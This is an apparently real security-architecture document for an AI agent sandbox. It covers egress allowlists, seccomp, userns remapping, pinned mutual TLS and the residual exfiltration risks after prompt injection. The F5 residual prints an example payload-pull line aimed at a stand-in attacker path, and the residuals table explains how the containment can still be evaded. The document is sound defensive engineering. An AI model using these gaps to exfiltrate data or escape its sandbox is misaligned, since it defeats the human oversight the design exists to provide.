# Security architecture — sandbox egress & exfiltration

What bounds prompt-injection exfiltration from an agent sandbox, and **what it does not close**.
Read the [Residuals](#residuals) before describing the sandbox as airtight: the controls make
exfiltration expensive and observable, not impossible.

Living document · seeded by P2-07 · long-term owner P2-17.

## Controls

| # | Control | Where |
|---|---|---|
| S-1 | Quarantine: no git-host credential, no remote but the daemon bare mirror | `WorktreeManager` |
| G-15 | Hardened spec: `no-new-privileges`, default-deny seccomp, `CapDrop ALL`, userns-remap, limits, read-only rootfs | `ContainerSpecBuilder`, `UsernsRemapPolicy`, `FirstBootStep` |
| G-11 | ext4-only worktree mount; Windows/UNC sources rejected at construction | `ContainerSpecBuilder` |
| A6 | Git host absent from the agent allowlist; only route is the daemon read-only git proxy | `EgressAllowlist`, `DaemonGitProxy` |
| G2 | Anti-memory-inspection quartet — the agent uid gets zero bytes of the OOB key `K` | `ContainerSpecBuilder`; ptrace sysctl in P2-05 |
| — | Default-deny egress: internal network + allowlist proxy + pinned DNS + iptables backstop | `EgressProxyConfigurator` |

The container-spec builder asserts G2's controls on **every** create request; dropping any is a typed
builder error. A per-container `--userns=host` opt-out is likewise a typed error.

## A6 — no direct git-host egress

The agent allowlist has **no git-host entry**, and the UI marks a user-added one as defeating A6.
Git-sourced installs (`pip install git+https://…`, Go modules, submodules) go through
`DaemonGitProxy`: fetch/`upload-pack` only, allowlisted `host + org` prefixes only, performed
daemon-side with the daemon's credentials. **Push/`receive-pack` has no code path** — the refusal is
structural, audited (`egress_denied`) and transparency-logged.

## G2 — anti-memory-inspection quartet

Four controls ship together:

1. the `K` tmpfs is mode 0400, owned by a supervisor uid ≠ the agent uid;
2. `kernel.yama.ptrace_scope ≥ 2` VM-wide (P2-05);
3. seccomp denies `process_vm_readv` / `process_vm_writev` / `ptrace`;
4. no `CAP_SYS_PTRACE`.

(3)+(4) close the in-container scrape structurally; (1) closes the file path; (2) is defence in depth.

The profile is the **canonical moby/containerd default-deny profile** with those three syscalls
removed from every allow rule and explicitly denied — a custom `seccomp=<json>` *replaces* Docker's
default rather than layering on it, so it reproduces that default and is never `unconfined`. Single
source of truth: `images/mainguard-agent-base/seccomp.json`, embedded as `SeccompProfile.Json` and
passed verbatim, so what the tests assert equals what the container runs.

## MG-17 — the userns remap

dockerd runs with `"userns-remap": "mainguard"` and a pinned subordinate range
(`mainguard:100000:65536`), so container id *N* → host id *100000 + N*: container root → 100000,
agent → 101000, supervisor → 101001. Neither remapped identity owns anything else on the VM.

**Why it mattered.** Before this, `UsernsMode` was empty and the daemon set no remap — container uid 0
*was* host uid 0, and the agent's uid 1000 *was* the VM's `mainguard` service user, which owns the
daemon, its keyring, its SQLite state and every binary the jails execute.

**Bind-mount ownership.** Docker does not chown bind-mount sources, and the daemon keeps writing the
two read-write ones as uid 1000, so it can neither chown them to 101000 nor write a tree owned by it.
They are shared through a group whose gid **is** the remapped agent gid (`mainguard-jail` = 101000),
setgid on both parents. Stronger than an owner-chown: the jail reads and writes what it needs but
owns neither tree, and has no access to anything else under `/home/mainguard`. The read-only
`adapters` mount is `a+rX` and deliberately *not* in that group.

`<vmRoot>/agents/<hash>/` gets the same `2775 mainguard:mainguard-jail` setgid treatment, so MG-3's
per-agent repositories are created with correct ownership by construction — a new git dir only has to
set `core.sharedRepository=group`, because umask is a property of the writing process and no parent
directory can supply it. Flipping the mirror mount read-only stays possible: that needs read+traverse
only, which the group already grants.

**The check, not the config.** `FirstBootStep` asserts the remap is *in effect* — `docker info` must
report the `name=userns` option **and** a `DockerRootDir` of `/var/lib/docker/100000.100000`, the only
direct evidence that the running remap is the one the mount ownership was provisioned against. The
probe is sentinel-framed, so "docker answered nothing" is a distinct reported outcome, never a pass.

**Migration.** Enabling the remap relocates dockerd's storage root, so prior images, containers and
networks become invisible rather than deleted. Images self-heal (startup auto-provision sees them
Missing and `docker load`s the bundled CI tars; ids and `mainguard.image.version` labels ride the tar,
so the MG-27 digest pin is unaffected). Containers and networks do not, and are removed with the old
daemon on the single boot that performs the flip.

## The control plane — loopback is not a boundary (MG-19)

The daemon binds `127.0.0.1:5250` **inside the WSL2 VM**; the GUI runs on Windows. It used to serve
cleartext h2c with a bearer token as the sole gate. That was insufficient, and the reasons were
measured, not assumed — on Windows 11 (10.0.26200):

| Measurement | Result |
|---|---|
| Windows process → `127.0.0.1:<port>`, listener bound to `127.0.0.1` in the VM | **CONNECTED** — `localhostForwarding` relays transparently |
| The in-VM listener's view of that peer | `127.0.0.1:<ephemeral>`, `/proc/net/tcp` **`uid=0`**, owning pid invisible |
| `SO_PEERCRED` on that accepted TCP socket | `pid=0 uid=-1 gid=-1` — meaningless (a Unix-socket facility) |

**The relay launders peer identity.** Any credential readable on the TCP path describes the WSL relay
(root, in-VM), never the calling Windows process. No peer-authentication scheme can be built on it.
And because all WSL2 distros share one network stack under NAT, the port is reachable from the user's
other distros too.

**A Unix socket was tried and rejected** — it cannot work for this topology:

| Measurement | Result |
|---|---|
| In-VM UDS, in-VM client | CONNECTED; `SO_PEERCRED` returns real `pid`/`uid`/`gid` |
| Windows process → that socket via `\\wsl.localhost\<distro>\…` | **`WSAENETDOWN` (10050)** |
| Control: Windows process → an AF_UNIX socket on the Windows filesystem | CONNECTED — so the above is a real negative |

The 9P share *displays* the socket (`File.Exists` true, length 0), which makes this look like a path
bug. It is not: 9P carries no socket semantics, so there is nothing to `connect()` to. A UDS control
plane would need an in-VM relay back to a TCP port — reintroducing the exposure with an extra hop.

**What shipped: pinned mutual TLS.** Both ends pinned by SHA-256 fingerprint to material minted fresh
each daemon start (`SessionTransportCertificates`, `0600` beside `daemon.token`). No plaintext
fallback, no downgrade knob. This closes: the token crossing the wire in cleartext; **port squatting**
(the client pins the daemon cert, so a handshake with an impostor fails before any HTTP/2 frame is
written — the token is never sent); and unauthenticated reachability (rejected at handshake, before
the HTTP/2 parser and `BearerTokenInterceptor`).

## Runtime toolchain — pre-baked, not `devbox add`

The intent was runtime `devbox add <tool>`. Not achievable under strict A6: devbox resolves through
nixhub then fetches **nixpkgs from github** at run time — the git host A6 exists to keep off the
agent's egress. Every workaround either still re-fetches github or needs a full local nixpkgs
evaluation.

**Decision:** the curated toolchain (jq, ripgrep, fd, tree, gnumake, nodejs, python3, go) is
Nix-installed **at image-build time** into `/opt/toolchain`, on the agent's PATH from the read-only
image. At runtime the tools run with **zero egress** — no git host, no nixhub, not even
`cache.nixos.org` — so A6 stays intact and the rootfs stays read-only. A fixed audited toolchain is
also a stronger posture than arbitrary runtime pulls: it closes the F5 fetch channel below.

## Residuals

Stated deliberately, so no reader mistakes default-deny egress for "no exfiltration is possible".

| # | Residual | Bounded by |
|---|---|---|
| **F5** | An allowlisted *language* proxy (Go, npm, crates) is a general-purpose fetch channel: `go get github.com/attacker/payload` resolves a second-stage payload and leaks bytes in the request path. A6 removes the *direct* git route; it does not close payload-pull or low-bandwidth request-path exfiltration. | **Declared-dependency scoping (preferred):** `DeclaredDependencyResolver` resolves `go.mod`/`package.json`/lockfiles to the exact module set; requests outside it are denied (`DeclaredDependencyDeniedException`) and logged. Where a native registry front can't be replaced, every fetch is a P2-17 transparency line **and** a P2-44 anomaly signal — never silent. Plus no push, no credentials (S-1), and the verify → review → flagged-gate → human-merge backstop — **that**, not egress, is what bounds a determined exfiltrator. |
| **MG-19** | A process running as the **same OS user** can read `daemon-client.pfx` and impersonate the client. No local transport defeats a same-uid attacker — a `0600` socket with `SO_PEERCRED` would not either, since the peer uid would match. | The bar moves from *read one file* to *read two files and complete a mutual handshake*; sniffing and port-squatting close outright. |
| **MG-33** | `kernel.yama.ptrace_scope` is not namespaced and WSL2 shares one kernel, so the value applies to the user's **other WSL2 distros** while the VM is up. A debugger attaching to a running pid elsewhere may start needing `sudo`. | Strictly a hardening, never a weakening. Resets on `wsl --shutdown`; the persisted drop-in lives inside `MainguardEnv` and goes away at uninstall. Per-distro scoping is impossible (non-namespaced sysctl; Docker rejects it as `--sysctl`). |

### Deferred work

Tracked in [`STATUS.md`](STATUS.md#open-items-outside-the-task-list):

- **A host-un-forgeable presence factor** (OPS §10.1) — the answer to the MG-19 residual.
- **Approver identity from the client certificate** — the connection now carries a genuine peer
  credential, so this is unblocked. It was never implemented.
- **P2-46** — a daemon-mediated nix resolver + binary mirror, resolving the closure daemon-side and
  injecting it into the jail, so an agent can add an arbitrary tool without the git host reaching the
  agent allowlist. The `devbox` binary is baked so that path can be built later.
